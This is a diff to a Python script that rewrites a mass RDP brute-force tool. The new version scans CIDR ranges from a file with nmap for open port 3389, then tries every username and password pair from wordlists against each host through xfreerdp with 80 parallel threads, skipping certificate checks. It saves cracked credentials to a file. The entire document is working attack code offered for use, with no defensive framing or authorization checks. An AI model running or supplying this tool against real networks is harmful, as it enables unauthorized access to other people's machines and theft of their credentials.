@@ -1,102 +1,160 @@
-import os
-import sys
-import time
+#!/usr/bin/env python3
+"""
+RDP brute force: scan CIDR file with native nmap, crack with username.txt + password.txt.
+Uses native nmap (subprocess) for speed and high parallelism for credential attempts.
+"""
 import argparse
+import re
 import subprocess
-from concurrent.futures import ThreadPoolExecutor
-from ipaddress import ip_network
-import nmap
-from queue import Queue
-from collections import defaultdict
-from threading import Event
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from pathlib import Path
+from threading import Lock
+
+RDP_PORT = 3389
+SUCCESS_FILE = "successful_logins.txt"
+RDP_SCAN_FILE = "rdp_scan.txt"
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(description='Python script for brute forcing RDP login')
-    parser.add_argument('--username', type=str, default='Administrator', help='username for RDP login (default: Administrator)')
-    parser.add_argument('--password-file', type=str, required=True, help='path to file containing password list')
-    parser.add_argument('--delay', type=int, default=0, help='delay between attempts in seconds (default: 5)')
-    parser.add_argument('--max-attempts', type=int, default=1, help='maximum number of attempts (default: 5)')
-    parser.add_argument('--threads', type=int, default=40, help='number of threads to use for brute forcing (default: 5)')
-    return parser.parse_args()
+    p = argparse.ArgumentParser(description="RDP scan (nmap) + brute force from CIDR, username.txt, password.txt")
+    p.add_argument("--cidr-file", type=str, default="cidr.txt", help="File with one CIDR per line (default: cidr.txt)")
+    p.add_argument("--username-file", type=str, default="username.txt", help="Usernames, one per line (default: username.txt)")
+    p.add_argument("--password-file", type=str, default="password.txt", help="Passwords, one per line (default: password.txt)")
+    p.add_argument("--threads", type=int, default=80, help="Parallel RDP attempts (default: 80)")
+    p.add_argument("--timeout", type=int, default=8, help="Seconds per xfreerdp attempt (default: 8)")
+    p.add_argument("--skip-scan", action="store_true", help="Skip nmap; use existing rdp_scan.txt")
+    p.add_argument("--nmap-args", type=str, default="-T4", help="Extra nmap args (default: -T4)")
+    return p.parse_args()
 
-def print_banner():
-    banner = '''
-                                   Okan YILDIZ RDP Brute Force
-'''
-    print(banner)
 
-def check_rdp_access(ip, rdp_port):
+def run_nmap_scan(cidr_file: Path, nmap_extra: str) -> list[str]:
+    """Run native nmap for port 3389 on all CIDRs in file. Returns list of open IPs."""
+    cidr_file = Path(cidr_file)
+    if not cidr_file.exists():
+        print(f"[!] CIDR file not found: {cidr_file}")
+        sys.exit(1)
+
+    out_file = Path(RDP_SCAN_FILE)
+    cmd = [
+        "nmap", "-p", str(RDP_PORT), "--open", "-Pn",
+        "-iL", str(cidr_file.resolve()),
+        "-oG", str(out_file.resolve()),
+    ]
+    if nmap_extra:
+        cmd.extend(nmap_extra.strip().split())
+
+    print(f"[*] Running: {' '.join(cmd)}")
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(1)
-        result = sock.connect_ex((ip, rdp_port))
-        if result == 0:
-            return True
-        else:
-            return False
-        sock.close()
-    except Exception as e:
-        print(f"Error: {e}")
+        subprocess.run(cmd, check=True, capture_output=True, timeout=3600)
+    except FileNotFoundError:
+        print("[!] nmap not found. Install nmap and ensure it's in PATH.")
+        sys.exit(1)
+    except subprocess.TimeoutExpired:
+        print("[!] nmap timed out.")
+        sys.exit(1)
+    except subprocess.CalledProcessError as e:
+        print(f"[!] nmap failed: {e}")
+        sys.exit(1)
+
+    return parse_nmap_grepable(out_file)
+
+
+def parse_nmap_grepable(path: Path) -> list[str]:
+    """Parse -oG file for hosts with port open (we only scan 3389)."""
+    ips = []
+    ip_re = re.compile(r"Host:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
+    with open(path, "r") as f:
+        for line in f:
+            if "/open/" not in line or line.startswith("#"):
+                continue
+            m = ip_re.search(line)
+            if m:
+                ips.append(m.group(1))
+    return ips
+
+
+def try_rdp(ip: str, user: str, password: str, timeout: int) -> bool:
+    """Try single RDP login; return True on success."""
+    cmd = [
+        "xfreerdp", f"/u:{user}", f"/p:{password}", f"/v:{ip}", f"/port:{RDP_PORT}",
+        "+auth-only", "/cert:ignore",
+    ]
+    try:
+        r = subprocess.run(
+            cmd,
+            capture_output=True,
+            timeout=timeout,
+        )
+        return r.returncode == 0
+    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
         return False
-
-def brute_force(ip, username, rdp_port, max_attempts, password_queue, stop_event):
-    while not password_queue.empty() and not stop_event.is_set():
-        password = password_queue.get()
-        attempts = 0
-        while attempts < max_attempts and not stop_event.is_set():
-            cmd = f'xfreerdp /u:{username} /p:{password} /v:{ip} /port:{rdp_port} +auth-only'
-            result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            if result == 0:
-                print(f'[SUCCESS] IP: {ip} | Password: {password}')
-                with open("successful_logins.txt", "a") as log:
-                    log.write(f"{ip},{username},{password}\n")
-                stop_event.set()
-                return
-            else:
-                print(f'[FAILED] IP: {ip} | Password: {password}')
-            attempts += 1
-  
-
-# def scan_rdp_ports(ip):
-#     try:
-#         nm = nmap.PortScanner()
-#         nm.scan(hosts=ip, arguments='-p 3389 -Pn -sT -T4')
-#         if ip in nm.all_hosts():
-#             tcp_info = nm[ip].get('tcp', {})
-#             port_info = tcp_info.get(3389, {})
-#             state = port_info.get('state')
-#             print(f"Scan result for {ip}: port 3389 is {state}")
-#             if state == 'open':
-#                 return True
-#         return False
-#     except Exception as e:
-#         print(f"Error scanning {ip}: {e}")
-#         return False
-
 
 
 def main():
-    print_banner()
     args = parse_args()
-    passwords = open(args.password_file, 'r').read().splitlines()
-    executor = ThreadPoolExecutor(max_workers=args.threads)
+    cidr_path = Path(args.cidr_file)
+    user_path = Path(args.username_file)
+    pass_path = Path(args.password_file)
 
-    with open("open_rdp_hosts.txt", "r") as f:
-        ip_list = f.read().splitlines()
-        for ip in ip_list:
-            print(f"[+] Launching attack on {ip}")
-            password_queue = Queue()
-            for password in passwords:
-                password_queue.put(password)
+    for p, name in [(user_path, "username"), (pass_path, "password")]:
+        if not p.exists():
+            print(f"[!] {name} file not found: {p}")
+            sys.exit(1)
 
-            stop_event = Event()  # flag for successful login per IP
+    usernames = [u.strip() for u in user_path.read_text(encoding="utf-8", errors="ignore").splitlines() if u.strip()]
+    passwords = [p.strip() for p in pass_path.read_text(encoding="utf-8", errors="ignore").splitlines() if p.strip()]
+    if not usernames or not passwords:
+        print("[!] username.txt and password.txt must each have at least one entry.")
+        sys.exit(1)
 
-            for _ in range(args.threads):
-                executor.submit(brute_force, ip, args.username, 3389, args.max_attempts, password_queue, stop_event)
+    if args.skip_scan:
+        open_ips = parse_nmap_grepable(Path(RDP_SCAN_FILE))
+        if not open_ips:
+            print("[!] No open RDP hosts in rdp_scan.txt. Run without --skip-scan first.")
+            sys.exit(1)
+        print(f"[*] Using {len(open_ips)} IPs from {RDP_SCAN_FILE}")
+    else:
+        open_ips = run_nmap_scan(cidr_path, args.nmap_args)
+        if not open_ips:
+            print("[*] No hosts with RDP open.")
+            return
+        print(f"[*] Found {len(open_ips)} hosts with RDP open")
 
-    time.sleep(args.delay)
+    # Build (ip, user, password) tasks
+    tasks = [(ip, u, p) for ip in open_ips for u in usernames for p in passwords]
+    cracked = set()
+    lock = Lock()
+    success_log = Lock()
+
+    def worker(item):
+        ip, user, password = item
+        with lock:
+            if ip in cracked:
+                return None
+        if try_rdp(ip, user, password, args.timeout):
+            with lock:
+                cracked.add(ip)
+            with success_log:
+                with open(SUCCESS_FILE, "a") as f:
+                    f.write(f"{ip},{user},{password}\n")
+            return (ip, user, password)
+        return None
+
+    print(f"[*] Trying {len(tasks)} combinations with {args.threads} threads (timeout={args.timeout}s)...")
+    with ThreadPoolExecutor(max_workers=args.threads) as ex:
+        futures = {ex.submit(worker, t): t for t in tasks}
+        for fut in as_completed(futures):
+            try:
+                r = fut.result()
+                if r:
+                    ip, user, passw = r
+                    print(f"[SUCCESS] {ip} | {user}:{passw}")
+            except Exception as e:
+                pass
+
+    print(f"[*] Done. Cracked {len(cracked)} host(s). Results appended to {SUCCESS_FILE}")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
